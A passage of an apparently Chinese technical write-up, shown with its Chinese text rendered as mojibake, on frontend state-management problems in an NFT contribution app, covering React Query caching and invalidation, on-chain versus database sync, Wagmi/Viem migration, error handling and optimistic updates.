// åœºæ™¯ï¼šç”¨æˆ·åœ¨é¡µé¢ A æŸ¥çœ‹è´¡çŒ®åˆ—è¡¨

// 1. React Query ç¼“å­˜äº†æ•°æ®ï¼ˆ5 åˆ†é’Ÿå†…æœ‰æ•ˆï¼‰
const { data: contributions } = useContributions();
// ç¼“å­˜æ•°æ®ï¼šcontribution #123 çŠ¶æ€ä¸º 'pending'

// 2. ç”¨æˆ·è·³è½¬åˆ°é¡µé¢ B é“¸é€ äº† NFT
await mintContribution('123');
// é“¾ä¸Šæ•°æ®ï¼šcontribution #123 å·²é“¸é€ 

// 3. ç”¨æˆ·è¿”å›é¡µé¢ A
// é—®é¢˜ï¼šReact Query è¿”å›ç¼“å­˜ï¼ˆçŠ¶æ€ä»æ˜¯ 'pending'ï¼‰
// åŸå› ï¼š5 åˆ†é’Ÿå†…ç¼“å­˜æœªå¤±æ•ˆ
// ç»“æœï¼šç”¨æˆ·çœ‹åˆ°é”™è¯¯çš„çŠ¶æ€

// è§£å†³æ–¹æ¡ˆ Aï¼šæ‰‹åŠ¨å¤±æ•ˆç¼“å­˜
import { useQueryClient } from '@tanstack/react-query';

function useMintContribution() {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: async (id: string) => {
      return await fetch(`/api/contributions/${id}/mint`, { method: 'POST' });
    },
    
    onSuccess: (data, contributionId) => {
      // é“¸é€ æˆåŠŸåï¼Œä½¿ç›¸å…³ç¼“å­˜å¤±æ•ˆ
      
      // å¤±æ•ˆå•ä¸ªè´¡çŒ®çš„ç¼“å­˜
      queryClient.invalidateQueries({ 
        queryKey: ['contribution', contributionId] 
      });
      
      // å¤±æ•ˆè´¡çŒ®åˆ—è¡¨ç¼“å­˜ï¼ˆå› ä¸ºçŠ¶æ€æ”¹å˜äº†ï¼‰
      queryClient.invalidateQueries({ 
        queryKey: ['contributions'] 
      });
      
      // å¤±æ•ˆæˆ‘çš„è´¡çŒ®ç¼“å­˜
      queryClient.invalidateQueries({ 
        queryKey: ['my-contributions'] 
      });
      
      // å¤±æ•ˆç»Ÿè®¡æ•°æ®ç¼“å­˜
      queryClient.invalidateQueries({ 
        queryKey: ['contribution-stats'] 
      });
      
      toast.success('NFT é“¸é€ æˆåŠŸï¼');
    },
  });
}
```

**æŒ‘æˆ˜ 2ï¼šé“¾ä¸Šæ•°æ®ä¸æ•°æ®åº“æ•°æ®ä¸åŒæ­¥**

```typescript
// åœºæ™¯ï¼šæ•°æ®åº“æ˜¾ç¤º"å·²é“¸é€ "ï¼Œä½†é“¾ä¸ŠæŸ¥è¯¢æ˜¾ç¤º"ä¸å­˜åœ¨"

function ContributionCard({ contribution }) {
  // æ•°æ®åº“æ•°æ®ï¼ˆä» React Queryï¼‰
  const dbStatus = contribution.status;  // 'minted'
  const dbTokenId = contribution.tokenId;  // '123'
  
  // é“¾ä¸Šæ•°æ®ï¼ˆä» wagmiï¼‰
  const { data: onChainOwner } = useReadContract({
    address: process.env.NEXT_PUBLIC_COMMIT_NFT_ADDRESS,
    abi: CommitNFTABI,
    functionName: 'ownerOf',
    args: [BigInt(dbTokenId)],
  });
  
  // é—®é¢˜ï¼šonChainOwner å¯èƒ½æ˜¯ nullï¼ˆNFT ä¸å­˜åœ¨ï¼‰
  // æˆ–è€…ï¼šonChainOwner ä¸ contribution.user.walletAddress ä¸åŒ
  
  // æ£€æµ‹ä¸ä¸€è‡´
  const isInconsistent = 
    dbStatus === 'minted' && !onChainOwner;  // æ•°æ®åº“è¯´é“¸é€ äº†ï¼Œä½†é“¾ä¸Šä¸å­˜åœ¨
  
  if (isInconsistent) {
    return (
      <div className="bg-yellow-100 p-4">
        <p className="text-yellow-800">âš ï¸ æ•°æ®ä¸ä¸€è‡´</p>
        <p>æ•°æ®åº“æ˜¾ç¤ºå·²é“¸é€ ï¼Œä½†é“¾ä¸Šæœªæ‰¾åˆ° NFT</p>
        <button onClick={async () => {
          // é‡æ–°åŒæ­¥çŠ¶æ€
          await fetch(`/api/contributions/${contribution.id}/sync-status`, {
            method: 'POST',
          });
        }}>
          é‡æ–°åŒæ­¥
        </button>
      </div>
    );
  }
  
  return <div>TokenID: {dbTokenId}</div>;
}

// åç«¯åŒæ­¥ API
// app/api/contributions/[id]/sync-status/route.ts
export async function POST(request: NextRequest, { params }) {
  const { id } = await params;
  const contribution = await ContributionRepository.findById(id);
  
  if (contribution.status === 'minted' && contribution.tokenId) {
    // æ£€æŸ¥é“¾ä¸Šæ˜¯å¦çœŸçš„å­˜åœ¨
    const provider = new ethers.JsonRpcProvider(process.env.SEPOLIA_RPC_URL);
    const contract = new ethers.Contract(
      process.env.NEXT_PUBLIC_COMMIT_NFT_ADDRESS!,
      CommitNFTABI,
      provider
    );
    
    try {
      const owner = await contract.ownerOf(contribution.tokenId);
      // NFT å­˜åœ¨ï¼ŒçŠ¶æ€æ­£ç¡®
      return NextResponse.json({ 
        status: 'ok',
        owner,
        tokenId: contribution.tokenId,
      });
    } catch (error) {
      // NFT ä¸å­˜åœ¨ï¼Œå›æ»šçŠ¶æ€
      await ContributionRepository.update(id, {
        status: ContributionStatus.FAILED,
        tokenId: null,
      });
      
      return NextResponse.json({ 
        status: 'reverted',
        message: 'NFT does not exist on chain',
      });
    }
  }
  
  return NextResponse.json({ status: 'ok' });
}
```

**æŒ‘æˆ˜ 3ï¼šç¼“å­˜æ—¶æ•ˆé…ç½®çš„æƒè¡¡**

```typescript
// React Query ç¼“å­˜é…ç½®

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 1000 * 60 * 5,    // 5 åˆ†é’Ÿå†…æ•°æ®è§†ä¸ºæ–°é²œ
      cacheTime: 1000 * 60 * 10,   // ç¼“å­˜ä¿ç•™ 10 åˆ†é’Ÿ
      refetchOnWindowFocus: false, // çª—å£èšç„¦æ—¶ä¸è‡ªåŠ¨åˆ·æ–°
      retry: 1,                    // å¤±è´¥é‡è¯• 1 æ¬¡
    },
  },
});

// é—®é¢˜ï¼šä¸€åˆ€åˆ‡çš„ç¼“å­˜ç­–ç•¥ä¸é€‚åˆæ‰€æœ‰æ•°æ®

// ä¸åŒæ•°æ®çš„ç†æƒ³ç¼“å­˜æ—¶é—´ï¼š
const cacheStrategies = {
  // é¢‘ç¹å˜åŒ–çš„æ•°æ®ï¼šçŸ­ç¼“å­˜
  'my-contributions': {
    staleTime: 1000 * 30,      // 30 ç§’
    cacheTime: 1000 * 60,      // 1 åˆ†é’Ÿ
    refetchOnWindowFocus: true, // åˆ‡æ¢çª—å£æ—¶åˆ·æ–°
  },
  
  // ç›¸å¯¹ç¨³å®šçš„æ•°æ®ï¼šä¸­ç­‰ç¼“å­˜
  'contribution-details': {
    staleTime: 1000 * 60 * 5,  // 5 åˆ†é’Ÿ
    cacheTime: 1000 * 60 * 10, // 10 åˆ†é’Ÿ
    refetchOnWindowFocus: false,
  },
  
  // å‡ ä¹ä¸å˜çš„æ•°æ®ï¼šé•¿ç¼“å­˜
  'user-profile': {
    staleTime: 1000 * 60 * 60,  // 1 å°æ—¶
    cacheTime: 1000 * 60 * 120, // 2 å°æ—¶
    refetchOnWindowFocus: false,
  },
  
  // é“¾ä¸Šæ•°æ®ï¼šä¸ç¼“å­˜ï¼ˆæ€»æ˜¯æœ€æ–°ï¼‰
  'nft-owner': {
    staleTime: 0,               // ç«‹å³è¿‡æœŸ
    cacheTime: 0,               // ä¸ç¼“å­˜
    refetchOnWindowFocus: true, // æ¯æ¬¡èšç„¦éƒ½åˆ·æ–°
  },
};

// å®ç°ï¼šæŒ‰æ•°æ®ç±»å‹é…ç½®ç¼“å­˜
export function useContributions(params?: any) {
  return useQuery({
    queryKey: ['contributions', params],
    queryFn: () => contributionsApi.getAll(params),
    // è‡ªå®šä¹‰ç¼“å­˜ç­–ç•¥
    staleTime: 1000 * 30,  // 30 ç§’ï¼ˆçŸ­ç¼“å­˜ï¼Œå› ä¸ºçŠ¶æ€é¢‘ç¹å˜åŒ–ï¼‰
    cacheTime: 1000 * 60,  // 1 åˆ†é’Ÿ
  });
}

export function useNFTOwner(tokenId: string) {
  return useReadContract({
    address: contractAddress,
    abi: CommitNFTABI,
    functionName: 'ownerOf',
    args: [BigInt(tokenId)],
    // wagmi é»˜è®¤ä¸ç¼“å­˜é“¾ä¸Šæ•°æ®ï¼ˆæ¯æ¬¡éƒ½æŸ¥è¯¢ï¼‰
  });
}
```

**æŒ‘æˆ˜ 4ï¼šå¤šä¸ªç»„ä»¶å…±äº«åŒä¸€æ•°æ®æº**

```typescript
// åœºæ™¯ï¼šå¤šä¸ªç»„ä»¶éœ€è¦åŒä¸€ä¸ªè´¡çŒ®çš„æ•°æ®

// ç»„ä»¶ Aï¼šè´¡çŒ®å¡ç‰‡
function ContributionCard({ contributionId }) {
  const { data: contribution } = useContribution(contributionId);
  return <div>{contribution?.title}</div>;
}

// ç»„ä»¶ Bï¼šè´¡çŒ®è¯¦æƒ…
function ContributionDetail({ contributionId }) {
  const { data: contribution } = useContribution(contributionId);
  return <div>{contribution?.description}</div>;
}

// é—®é¢˜ï¼šä¸¤ä¸ªç»„ä»¶ä¼šå‘èµ·ä¸¤æ¬¡ç›¸åŒçš„è¯·æ±‚å—ï¼Ÿ

// âœ… ç­”æ¡ˆï¼šä¸ä¼šï¼React Query ä¼šè‡ªåŠ¨åˆå¹¶
// åŸç†ï¼š
// 1. ç»„ä»¶ A è°ƒç”¨ useContribution('123')
// 2. React Query å‘èµ·è¯·æ±‚ï¼ŒqueryKey: ['contribution', '123']
// 3. ç»„ä»¶ B è°ƒç”¨ useContribution('123')ï¼ˆåŒä¸€ä¸ª IDï¼‰
// 4. React Query å‘ç° queryKey ç›¸åŒï¼Œå¤ç”¨æ­£åœ¨è¿›è¡Œçš„è¯·æ±‚
// 5. ä¸¤ä¸ªç»„ä»¶å…±äº«åŒä¸€ä¸ªæ•°æ®å’Œç¼“å­˜

// éªŒè¯ï¼š
import { useQueryClient } from '@tanstack/react-query';

function DebugCache() {
  const queryClient = useQueryClient();
  
  // æŸ¥çœ‹ç¼“å­˜çŠ¶æ€
  const cache = queryClient.getQueryCache();
  console.log('å½“å‰ç¼“å­˜çš„æŸ¥è¯¢:', cache.getAll());
  
  // æ‰‹åŠ¨è·å–ç¼“å­˜æ•°æ®
  const cachedData = queryClient.getQueryData(['contribution', '123']);
  console.log('è´¡çŒ® 123 çš„ç¼“å­˜æ•°æ®:', cachedData);
  
  return null;
}
```

**æŒ‘æˆ˜ 5ï¼šå…¨å±€çŠ¶æ€ vs æœåŠ¡ç«¯çŠ¶æ€**

```typescript
// æ··æ·†ï¼šä»€ä¹ˆæ•°æ®åº”è¯¥ç”¨ React Queryï¼Œä»€ä¹ˆç”¨ Contextï¼Ÿ

// âŒ é”™è¯¯ï¼šç”¨ Context ç®¡ç†æœåŠ¡ç«¯æ•°æ®
const ContributionsContext = createContext();

function ContributionsProvider({ children }) {
  const [contributions, setContributions] = useState([]);
  
  useEffect(() => {
    // æ¯æ¬¡ç»„ä»¶æŒ‚è½½éƒ½è¦é‡æ–°è·å–
    fetch('/api/contributions')
      .then(r => r.json())
      .then(data => setContributions(data));
  }, []);
  
  // é—®é¢˜ï¼š
  // 1. æ²¡æœ‰ç¼“å­˜ï¼ˆæ¯æ¬¡æŒ‚è½½éƒ½è¯·æ±‚ï¼‰
  // 2. æ²¡æœ‰è‡ªåŠ¨åˆ·æ–°
  // 3. æ²¡æœ‰ loading/error çŠ¶æ€
  // 4. å¤šä¸ªç»„ä»¶é‡å¤è¯·æ±‚
  
  return (
    <ContributionsContext.Provider value={contributions}>
      {children}
    </ContributionsContext.Provider>
  );
}

// âœ… æ­£ç¡®ï¼šç”¨ React Query ç®¡ç†æœåŠ¡ç«¯æ•°æ®
function useContributions() {
  return useQuery({
    queryKey: ['contributions'],
    queryFn: () => contributionsApi.getAll(),
    // è‡ªåŠ¨ç¼“å­˜ã€è‡ªåŠ¨åˆ·æ–°ã€è‡ªåŠ¨é‡è¯•
  });
}

// âœ… æ­£ç¡®ï¼šç”¨ Context ç®¡ç†å®¢æˆ·ç«¯å…¨å±€çŠ¶æ€
const ThemeContext = createContext();

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');  // å®¢æˆ·ç«¯çŠ¶æ€
  
  return (
    <ThemeContext.Provider value={{ theme, setTheme }}>
      {children}
    </ThemeContext.Provider>
  );
}

// å†³ç­–è¡¨ï¼š
const decisions = {
  'è´¡çŒ®åˆ—è¡¨': 'React Query',      // æœåŠ¡ç«¯æ•°æ®
  'ç”¨æˆ·ä¿¡æ¯': 'React Query',      // æœåŠ¡ç«¯æ•°æ®
  'NFT çŠ¶æ€': 'wagmi hooks',      // é“¾ä¸Šæ•°æ®
  'é’±åŒ…è¿æ¥çŠ¶æ€': 'Context',      // å®¢æˆ·ç«¯å…¨å±€çŠ¶æ€
  'ä¸»é¢˜è®¾ç½®': 'Context',          // å®¢æˆ·ç«¯å…¨å±€çŠ¶æ€
  'è¡¨å•è¾“å…¥': 'useState',         // ç»„ä»¶æœ¬åœ°çŠ¶æ€
  'Modal å¼€å…³': 'useState',       // ç»„ä»¶æœ¬åœ°çŠ¶æ€
};
```

**æŒ‘æˆ˜ 6ï¼šReact Query ä¸ Wagmi Query çš„æ•´åˆ**

```typescript
// é—®é¢˜ï¼šReact Query å’Œ Wagmi éƒ½ä½¿ç”¨ @tanstack/react-query

// æ¶æ„ï¼š
<RainbowKitProvider>
  <WagmiProvider config={wagmiConfig}>
    <QueryClientProvider client={queryClient}>  {/* â† åŒä¸€ä¸ª QueryClient */}
      <App />
    </QueryClientProvider>
  </WagmiProvider>
</RainbowKitProvider>

// å¥½å¤„ï¼šå…±äº«ç¼“å­˜æœºåˆ¶
// 1. wagmi çš„ useReadContract ä½¿ç”¨ React Query ç¼“å­˜
// 2. è‡ªå®šä¹‰çš„ useContributions ä¹Ÿä½¿ç”¨ React Query ç¼“å­˜
// 3. ç»Ÿä¸€çš„ queryClient ç®¡ç†æ‰€æœ‰ç¼“å­˜

// ç¤ºä¾‹ï¼šç»„åˆä½¿ç”¨
function ContributionWithNFTStatus({ contributionId }) {
  // æ•°æ®åº“æ•°æ®ï¼ˆReact Queryï¼‰
  const { data: contribution } = useContribution(contributionId);
  
  // é“¾ä¸Šæ•°æ®ï¼ˆWagmi + React Queryï¼‰
  const { data: owner } = useReadContract({
    address: process.env.NEXT_PUBLIC_COMMIT_NFT_ADDRESS,
    abi: CommitNFTABI,
    functionName: 'ownerOf',
    args: contribution?.tokenId ? [BigInt(contribution.tokenId)] : undefined,
    query: {
      enabled: !!contribution?.tokenId,  // ä»…å½“æœ‰ tokenId æ—¶æŸ¥è¯¢
      staleTime: 1000 * 60,  // 1 åˆ†é’Ÿç¼“å­˜
    },
  });
  
  // æ•´åˆä¸¤ä¸ªæ•°æ®æº
  const status = {
    database: contribution?.status,       // æ•°æ®åº“çŠ¶æ€
    blockchain: owner ? 'minted' : null,  // é“¾ä¸ŠçŠ¶æ€
    isConsistent: (contribution?.status === 'minted') === !!owner,
  };
  
  return (
    <div>
      <p>æ•°æ®åº“çŠ¶æ€: {status.database}</p>
      <p>é“¾ä¸ŠçŠ¶æ€: {status.blockchain}</p>
      {!status.isConsistent && (
        <p className="text-red-500">âš ï¸ æ•°æ®ä¸ä¸€è‡´</p>
      )}
    </div>
  );
}
```

**æŒ‘æˆ˜ 7ï¼šSupabase Realtime ä¸ React Query çš„å†²çª**

```typescript
// åœºæ™¯ï¼šåŒæ—¶ä½¿ç”¨ Supabase Realtime å’Œ React Query

// æ–¹æ³• Aï¼šSupabase Realtime è®¢é˜…
function ContributionsList() {
  const [contributions, setContributions] = useState([]);
  
  useEffect(() => {
    const channel = supabase
      .channel('contributions')
      .on('postgres_changes', {
        event: '*',
        schema: 'public',
        table: 'contributions',
      }, (payload) => {
        // å®æ—¶æ›´æ–°
        setContributions(prev => {
          // å¤„ç† INSERT/UPDATE/DELETE
          // ...
        });
      })
      .subscribe();
    
    return () => supabase.removeChannel(channel);
  }, []);
  
  // é—®é¢˜ï¼šä¸ React Query ç¼“å­˜ä¸åŒæ­¥
}

// æ–¹æ³• Bï¼šReact Query
function ContributionsList() {
  const { data: contributions } = useContributions();
  // 5 åˆ†é’Ÿå†…ç¼“å­˜ï¼Œä¸æ˜¯å®æ—¶
}

// âŒ é—®é¢˜ï¼šä¸¤è€…æ··ç”¨ä¼šå¯¼è‡´æ•°æ®ä¸ä¸€è‡´

// âœ… è§£å†³æ–¹æ¡ˆï¼šRealtime æ›´æ–° React Query ç¼“å­˜
function useContributionsRealtime() {
  const queryClient = useQueryClient();
  
  // 1. ä½¿ç”¨ React Query è·å–åˆå§‹æ•°æ®
  const query = useQuery({
    queryKey: ['contributions'],
    queryFn: () => contributionsApi.getAll(),
  });
  
  // 2. è®¢é˜… Supabase Realtime
  useEffect(() => {
    const channel = supabase
      .channel('contributions')
      .on('postgres_changes', {
        event: '*',
        schema: 'public',
        table: 'contributions',
      }, (payload) => {
        console.log('Realtime æ›´æ–°:', payload);
        
        // 3. æ›´æ–° React Query ç¼“å­˜
        if (payload.eventType === 'INSERT') {
          // æ–°å¢ï¼šä½¿åˆ—è¡¨ç¼“å­˜å¤±æ•ˆï¼Œé‡æ–°è·å–
          queryClient.invalidateQueries({ queryKey: ['contributions'] });
        }
        
        if (payload.eventType === 'UPDATE') {
          // æ›´æ–°ï¼šç›´æ¥ä¿®æ”¹ç¼“å­˜
          queryClient.setQueryData(['contributions'], (old: any) => {
            if (!old) return old;
            return old.map((c: any) => 
              c.id === payload.new.id ? payload.new : c
            );
          });
          
          // åŒæ—¶æ›´æ–°å•ä¸ªè´¡çŒ®çš„ç¼“å­˜
          queryClient.setQueryData(['contribution', payload.new.id], payload.new);
        }
        
        if (payload.eventType === 'DELETE') {
          // åˆ é™¤ï¼šä»ç¼“å­˜ä¸­ç§»é™¤
          queryClient.setQueryData(['contributions'], (old: any) => {
            if (!old) return old;
            return old.filter((c: any) => c.id !== payload.old.id);
          });
        }
      })
      .subscribe();
    
    return () => supabase.removeChannel(channel);
  }, [queryClient]);
  
  return query;
}

// ä¼˜ç‚¹ï¼š
// - âœ… åˆå§‹åŠ è½½ä½¿ç”¨ç¼“å­˜ï¼ˆå¿«ï¼‰
// - âœ… åç»­æ›´æ–°ä½¿ç”¨ Realtimeï¼ˆå®æ—¶ï¼‰
// - âœ… æ–­çº¿åè‡ªåŠ¨å›é€€åˆ°è½®è¯¢
```

---

### 6.2 Wagmi + Viem é€‚é…é—®é¢˜

#### é—®é¢˜æè¿°

é¡¹ç›®ä» Ethers.js è¿ç§»åˆ° Wagmi/Viemï¼Œéœ€è¦é€‚é…ä¸åŒçš„ API é£æ ¼å’Œç±»å‹ç³»ç»Ÿã€‚

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šViem ç±»å‹ç³»ç»Ÿçš„ä¸¥æ ¼æ€§**

```typescript
// Viem ä½¿ç”¨ä¸¥æ ¼çš„ç±»å‹ç³»ç»Ÿ

// âŒ Ethers.js é£æ ¼ï¼ˆç±»å‹æ¾æ•£ï¼‰
const address = '0x1234567890abcdef1234567890abcdef12345678';
const tx = await contract.transfer(address, 1000000);  // number ç±»å‹

// âœ… Viem é£æ ¼ï¼ˆç±»å‹ä¸¥æ ¼ï¼‰
const address = '0x1234567890abcdef1234567890abcdef12345678' as `0x${string}`;
const amount = BigInt(1000000);  // å¿…é¡»æ˜¯ bigint
const tx = await contract.transfer(address, amount);

// ç±»å‹è¦æ±‚ï¼š
// 1. åœ°å€å¿…é¡»æ˜¯ `0x${string}` ç±»å‹
const validAddress: `0x${string}` = '0x...';

// 2. æ•°å€¼å¿…é¡»æ˜¯ bigint
const validAmount: bigint = BigInt(1000000);
const validAmount2: bigint = 1000000n;  // å­—é¢é‡è¯­æ³•

// 3. bytes å¿…é¡»æ˜¯ Hex ç±»å‹
const validBytes: Hex = '0x1234...';

// ç±»å‹è½¬æ¢å·¥å…·ï¼š
import { parseEther, formatEther, isAddress } from 'viem';

// è§£æ ETHï¼ˆå­—ç¬¦ä¸² â†’ bigintï¼‰
const amount = parseEther('1.5');  // 1500000000000000000n

// æ ¼å¼åŒ– ETHï¼ˆbigint â†’ å­—ç¬¦ä¸²ï¼‰
const formatted = formatEther(1500000000000000000n);  // '1.5'

// éªŒè¯åœ°å€
if (isAddress(address)) {
  const typedAddress = address as `0x${string}`;
  // ...
}
```

**æŒ‘æˆ˜ 2ï¼šuseWriteContract çš„å¼‚æ­¥å¤„ç†**

```typescript
// Wagmi çš„ writeContract æ˜¯ä¸¤é˜¶æ®µæ“ä½œ

import { useWriteContract, useWaitForTransactionReceipt } from 'wagmi';

function MintButton({ contributionId }) {
  // é˜¶æ®µ 1ï¼šå‘é€äº¤æ˜“ï¼ˆè·å– hashï¼‰
  const { 
    writeContract, 
    data: txHash,     // äº¤æ˜“å“ˆå¸Œ
    isPending,        // æ­£åœ¨å‘é€äº¤æ˜“
    error: writeError 
  } = useWriteContract();
  
  // é˜¶æ®µ 2ï¼šç­‰å¾…ç¡®è®¤ï¼ˆä½¿ç”¨ hashï¼‰
  const { 
    isLoading: isConfirming,  // æ­£åœ¨ç¡®è®¤
    isSuccess: isConfirmed,   // å·²ç¡®è®¤
    error: confirmError 
  } = useWaitForTransactionReceipt({
    hash: txHash,  // ä½¿ç”¨é˜¶æ®µ 1 çš„ hash
  });
  
  const handleMint = async () => {
    // è°ƒç”¨åˆçº¦ï¼ˆå¼‚æ­¥ï¼‰
    writeContract({
      address: contractAddress,
      abi: CommitNFTABI,
      functionName: 'mintCommit',
      args: [to, commitData, metadataUri],
    });
    
    // æ³¨æ„ï¼šwriteContract ç«‹å³è¿”å›ï¼Œä¸ç­‰å¾…ç¡®è®¤
    // éœ€è¦é€šè¿‡ txHash å’Œ useWaitForTransactionReceipt ç›‘å¬ç¡®è®¤
  };
  
  // ç›‘å¬ç¡®è®¤çŠ¶æ€
  useEffect(() => {
    if (isConfirmed) {
      toast.success('äº¤æ˜“å·²ç¡®è®¤ï¼');
      // æ›´æ–°æ•°æ®åº“...
    }
  }, [isConfirmed]);
  
  // æ˜¾ç¤ºä¸åŒçŠ¶æ€
  if (isPending) return <button disabled>å‘é€äº¤æ˜“ä¸­...</button>;
  if (isConfirming) return <button disabled>ç­‰å¾…ç¡®è®¤...</button>;
  if (isConfirmed) return <button disabled>å·²é“¸é€ </button>;
  
  return <button onClick={handleMint}>é“¸é€  NFT</button>;
}

// å¯¹æ¯” Ethers.jsï¼ˆä¸€æ­¥åˆ°ä½ï¼‰
async function mintWithEthers() {
  const tx = await contract.mintCommit(to, commitData, metadataUri);
  const receipt = await tx.wait();  // â† é˜»å¡ï¼Œç­‰å¾…ç¡®è®¤
  console.log('å·²ç¡®è®¤:', receipt.hash);
}

// Wagmi çš„ä¼˜ç‚¹ï¼š
// - âœ… æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼ˆå¯ä»¥æ˜¾ç¤º"å‘é€ä¸­"å’Œ"ç¡®è®¤ä¸­"ï¼‰
// - âœ… å¯ä»¥æå‰è·å– hashï¼ˆç”¨æˆ·å¯ä»¥å»åŒºå—æµè§ˆå™¨æŸ¥çœ‹ï¼‰
// - âœ… è‡ªåŠ¨ç®¡ç† loading çŠ¶æ€

// Wagmi çš„ç¼ºç‚¹ï¼š
// - âš ï¸ éœ€è¦ä¸¤ä¸ª hooksï¼ˆwriteContract + waitForReceiptï¼‰
// - âš ï¸ çŠ¶æ€ç®¡ç†å¤æ‚ï¼ˆisPending, isConfirming, isConfirmedï¼‰
```

**æŒ‘æˆ˜ 3ï¼šé”™è¯¯å¤„ç†çš„å·®å¼‚**

```typescript
// Ethers.js é”™è¯¯å¤„ç†
try {
  const tx = await contract.mintCommit(...);
  await tx.wait();
} catch (error) {
  if (error.code === 'ACTION_REJECTED') {
    toast.error('ç”¨æˆ·å–æ¶ˆäº¤æ˜“');
  } else if (error.code === 'INSUFFICIENT_FUNDS') {
    toast.error('ä½™é¢ä¸è¶³');
  }
}

// Wagmi é”™è¯¯å¤„ç†
const { writeContract, error } = useWriteContract();

useEffect(() => {
  if (error) {
    // Viem é”™è¯¯å¯¹è±¡
    if (error.name === 'UserRejectedRequestError') {
      toast.error('ç”¨æˆ·å–æ¶ˆäº¤æ˜“');
    } else if (error.message.includes('insufficient funds')) {
      toast.error('ä½™é¢ä¸è¶³');
    } else if (error.message.includes('execution reverted')) {
      // åˆçº¦ revert
      const reason = parseRevertReason(error);
      toast.error(`åˆçº¦æ‹’ç»: ${reason}`);
    }
  }
}, [error]);

// è§£æ revert åŸå› 
function parseRevertReason(error: any): string {
  // Viem ä¼šè‡ªåŠ¨è§£æ revert reason
  if (error.cause?.reason) {
    return error.cause.reason;  // ä¾‹å¦‚ï¼š"Commit already minted"
  }
  
  // ä» data ä¸­è§£æ
  if (error.cause?.data) {
    try {
      const iface = new ethers.Interface(CommitNFTABI);
      const decoded = iface.parseError(error.cause.data);
      return decoded?.name || 'Unknown error';
    } catch {
      return 'Contract execution failed';
    }
  }
  
  return error.message || 'Unknown error';
}
```

**æŒ‘æˆ˜ 4ï¼šProvider/Signer çš„è·å–æ–¹å¼**

```typescript
// Ethers.js é£æ ¼ï¼ˆå·²å¼ƒç”¨ï¼‰
const provider = new ethers.BrowserProvider(window.ethereum);
const signer = await provider.getSigner();
const contract = new ethers.Contract(address, abi, signer);

// Wagmi/Viem é£æ ¼ï¼ˆå½“å‰ï¼‰
// æ–¹å¼ 1ï¼šä½¿ç”¨ hooksï¼ˆæ¨èï¼‰
import { useWriteContract } from 'wagmi';

const { writeContract } = useWriteContract();
writeContract({
  address: contractAddress,
  abi: CommitNFTABI,
  functionName: 'mintCommit',
  args: [to, commitData, metadataUri],
});

// æ–¹å¼ 2ï¼šæ‰‹åŠ¨è·å–ï¼ˆä¸æ¨èï¼Œä»…ç‰¹æ®Šåœºæ™¯ï¼‰
import { useWalletClient, usePublicClient } from 'wagmi';
import { getContract } from 'viem';

function MyComponent() {
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  
  const contract = getContract({
    address: contractAddress,
    abi: CommitNFTABI,
    client: { public: publicClient, wallet: walletClient },
  });
  
  // ä½¿ç”¨ contractï¼ˆViem å®ä¾‹ï¼‰
  const result = await contract.read.balanceOf([address]);
  await contract.write.transfer([to, amount]);
}

// ä¸ºä»€ä¹ˆä¸æ¨èæ–¹å¼ 2ï¼Ÿ
// - wagmi hooks æä¾›è‡ªåŠ¨çŠ¶æ€ç®¡ç†
// - hooks å¤„ç†é”™è¯¯ã€loadingã€é‡è¯•
// - hooks è‡ªåŠ¨ç¼“å­˜æŸ¥è¯¢ç»“æœ
```

---

### 6.3 ç”¨æˆ·ä½“éªŒä¼˜åŒ–é—®é¢˜

#### é—®é¢˜æè¿°

å‰ç«¯çŠ¶æ€ç®¡ç†ç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒï¼Œå¦‚ä½•æä¾›æµç•…ã€åŠæ—¶çš„åé¦ˆï¼Ÿ

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šLoading çŠ¶æ€çš„ç²’åº¦**

```typescript
// é—®é¢˜ï¼šåªæœ‰ä¸€ä¸ªå…¨å±€ loadingï¼Œç”¨æˆ·ä¸çŸ¥é“åœ¨ç­‰ä»€ä¹ˆ

// âŒ ç²—ç²’åº¦ loading
function MyPage() {
  const [loading, setLoading] = useState(false);
  
  const loadData = async () => {
    setLoading(true);
    await fetchContributions();
    await fetchStats();
    await fetchRepos();
    setLoading(false);
  };
  
  if (loading) return <Spinner />;  // ç”¨æˆ·ä¸çŸ¥é“åœ¨åŠ è½½ä»€ä¹ˆ
  
  return <div>...</div>;
}

// âœ… ç»†ç²’åº¦ loadingï¼ˆReact Query è‡ªåŠ¨æä¾›ï¼‰
function MyPage() {
  const { data: contributions, isLoading: loadingContributions } = useContributions();
  const { data: stats, isLoading: loadingStats } = useContributionStats();
  const { data: repos, isLoading: loadingRepos } = useRepos();
  
  return (
    <div>
      {/* åˆ†åˆ«æ˜¾ç¤ºæ¯ä¸ªéƒ¨åˆ†çš„ loading */}
      <section>
        <h2>è´¡çŒ®åˆ—è¡¨</h2>
        {loadingContributions ? (
          <Skeleton count={5} />  // éª¨æ¶å±
        ) : (
          <ContributionsList data={contributions} />
        )}
      </section>
      
      <section>
        <h2>ç»Ÿè®¡æ•°æ®</h2>
        {loadingStats ? (
          <Skeleton count={3} />
        ) : (
          <StatsPanel data={stats} />
        )}
      </section>
      
      <section>
        <h2>ä»“åº“</h2>
        {loadingRepos ? (
          <Skeleton count={4} />
        ) : (
          <ReposList data={repos} />
        )}
      </section>
    </div>
  );
}
```

**æŒ‘æˆ˜ 2ï¼šä¹è§‚æ›´æ–°çš„æ—¶æœºé€‰æ‹©**

```typescript
// ä¹è§‚æ›´æ–°ï¼šä¸ç­‰åç«¯è¿”å›ï¼Œç«‹å³æ›´æ–° UI

// é€‚åˆåœºæ™¯ï¼šæ“ä½œæˆåŠŸç‡é«˜ï¼Œå¤±è´¥æˆæœ¬ä½
function useLikeContribution() {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: async (id: string) => {
      return await fetch(`/api/contributions/${id}/like`, { method: 'POST' });
    },
    
    // âœ… ä¹è§‚æ›´æ–°ï¼šç«‹å³å¢åŠ ç‚¹èµæ•°
    onMutate: async (id) => {
      await queryClient.cancelQueries({ queryKey: ['contribution', id] });
      const previous = queryClient.getQueryData(['contribution', id]);
      
      queryClient.setQueryData(['contribution', id], (old: any) => ({
        ...old,
        likes: (old.likes || 0) + 1,  // ç«‹å³ +1
      }));
      
      return { previous };
    },
    
